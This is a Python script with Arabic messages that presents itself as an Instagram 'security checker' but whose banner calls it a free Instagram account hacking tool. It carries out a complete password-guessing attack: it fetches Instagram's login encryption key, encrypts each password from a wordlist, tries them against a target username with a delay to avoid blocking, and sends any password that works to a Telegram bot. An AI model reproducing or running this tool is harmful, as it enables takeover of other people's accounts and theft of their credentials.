import os
import time
import requests
from Cryptodome import Random
from Cryptodome.Cipher import AES
from nacl.public import PublicKey, SealedBox
import base64
import struct
import datetime
import binascii
import json

class InstagramSecurityChecker:
    def __init__(self):
        self.session = requests.Session()
        self.headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
        }
        self.encryption_data = None
        
    def get_encryption_data(self):
        """الحصول على بيانات التشفير من إنستغرام"""
        try:
            response = self.session.get(
                'https://www.instagram.com/data/shared_data/',
                headers=self.headers
            )
            response.raise_for_status()
            data = response.json()
            
            self.encryption_data = {
                'public_key': data['encryption']['public_key'],
                'key_id': data['encryption']['key_id'],
                'version': data['encryption']['version'],
                'csrf_token': data["config"]["csrf_token"]
            }
            return True
        except Exception as e:
            print(f"خطأ في الحصول على بيانات التشفير: {e}")
            return False
    
    def encrypt_password(self, password):
        """تشفير كلمة المرور باستخدام خوارزمية إنستغرام"""
        if not self.encryption_data:
            if not self.get_encryption_data():
                return None
                
        try:
            key = Random.get_random_bytes(32)
            iv = bytes([0] * 12)
            time_val = int(datetime.datetime.now().timestamp())

            aes = AES.new(key, AES.MODE_GCM, nonce=iv, mac_len=16)
            aes.update(str(time_val).encode('utf-8'))
            encrypted_password, cipher_tag = aes.encrypt_and_digest(password.encode('utf-8'))

            pub_key_bytes = binascii.unhexlify(self.encryption_data['public_key'])
            seal_box = SealedBox(PublicKey(pub_key_bytes))
            encrypted_key = seal_box.encrypt(key)

            encrypted = bytes([1,
                            int(self.encryption_data['key_id']),
                            *list(struct.pack('<h', len(encrypted_key))),
                            *list(encrypted_key),
                            *list(cipher_tag),
                            *list(encrypted_password)])
            encrypted = base64.b64encode(encrypted).decode('utf-8')

            return f'#PWD_INSTAGRAM_BROWSER:{self.encryption_data["version"]}:{time_val}:{encrypted}'
        except Exception as e:
            print(f"خطأ في تشفير كلمة المرور: {e}")
            return None
    
    def test_login(self, username, password):
        """اختبار تسجيل الدخول إلى إنستغرام"""
        encrypted_password = self.encrypt_password(password)
        if not encrypted_password:
            return False, "خطأ في التشفير"
        
        login_headers = self.headers.copy()
        login_headers.update({
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.instagram.com',
            'priority': 'u=1, i',
            'referer': 'https://www.instagram.com/',
            'x-asbd-id': '359341',
            'x-csrftoken': self.encryption_data['csrf_token'],
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': '0',
            'x-instagram-ajax': '1025567687',
            'x-requested-with': 'XMLHttpRequest',
        })
        
        data = {
            'enc_password': encrypted_password,
            'optIntoOneTap': 'false',
            'username': username,
        }
        
        try:
            response = self.session.post(
                'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                headers=login_headers,
                data=data
            )
            response.raise_for_status()
            result = response.json()
            
            if result.get("authenticated") and result.get("userId"):
                return True, "نجح التسجيل"
            else:
                if result.get("message"):
                    return False, result["message"]
                elif result.get("error"):
                    return False, result["error"]
                else:
                    return False, "فشل التسجيل"
                
        except Exception as e:
            return False, f"خطأ في الاتصال: {e}"

def send_telegram_notification(bot_token, chat_id, username, password):
    """إرسال إشعار عبر التلجرام عند العثور على كلمة مرور صحيحة"""
    try:
        message = f"• تم العثور على كلمة مرور صحيحة\n• الحساب: {username}\n• كلمة المرور: {password}\n• الوقت: {time.strftime('%Y-%m-%d %H:%M:%S')}\n• المبرمج; @AHMED_KHANA"
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {
            "chat_id": chat_id,
            "text": message
        }
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print("تم إرسال الإشعار بنجاح")
        else:
            print("فشل في إرسال الإشعار")
    except Exception as e:
        print(f"خطأ في إرسال الإشعار: {e}")

def load_passwords(file_path):
    """تحميل كلمات المرور من ملف"""
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip()]
        return passwords
    except Exception as e:
        print(f"خطأ في تحميل الملف: {e}")
        return []

def main():
    print("=" * 60)
    print("أداة اختراق انستكرام نسخه مجانيه")
    print("=" * 60)
    print("سكريت اختراق حسابات انستكرام")
    print("المبرمج :احمد خان @AHMED_KHANA")
    print("=" * 60)
    
    # طلب بيانات البوت (اختياري)
    use_bot = input("هل تريد إشعار عبر التلجرام عند العثور على كلمة مرور؟ (y/n): ").strip().lower()
    bot_token = ""
    chat_id = ""
    
    if use_bot == 'y':
        bot_token = input("أدخل توكن البوت: ").strip()
        chat_id = input("أدخل الأيدي الخاص بك: ").strip()
    
    # طلب اسم المستخدم
    username = input("أدخل اسم المستخدم الذي تريد فحصه: ").strip()
    
    # تحميل كلمات المرور
    file_path = input("أدخل اسم ملف كلمات المرور: ").strip()
    passwords = load_passwords(file_path)
    
    if not passwords:
        print("لا توجد كلمات مرور في الملف!")
        return
    
    print(f"\nبدء الفحص على الحساب: {username} مع {len(passwords)} كلمة مرور...")
    print("هذه العملية قد تستغرق بعض الوقت...")
    
    checker = InstagramSecurityChecker()
    found_password = None
    
    for i, password in enumerate(passwords, 1):
        print(f"جاري اختبار كلمة المرور {i}/{len(passwords)}: {password}", end=" - ")
        
        success, message = checker.test_login(username, password)
        
        if success:
            print("✓ نجح التسجيل!")
            print(f"تم العثور على كلمة المرور الصحيحة: {password}")
            found_password = password
            
            # إرسال إشعار إذا تم طلبه
            if use_bot == 'y' and bot_token and chat_id:
                send_telegram_notification(bot_token, chat_id, username, password)
            
            break
        else:
            print("✗ فشل")
        
        # تأخير بين المحاولات لتجنب الحظر
        time.sleep(2)
    
    print("\n" + "=" * 60)
    print("نتائج الفحص:")
    if found_password:
        print(f"✓ تم العثور على كلمة المرور الصحيحة: {found_password}")
        print("احمد خان اخترقلك حساب @AHMED_KHANA")
    else:
        print("✗ لم يتم العثور على كلمات مرور صحيحة.")
    print("=" * 60)

if __name__ == "__main__":
    main()
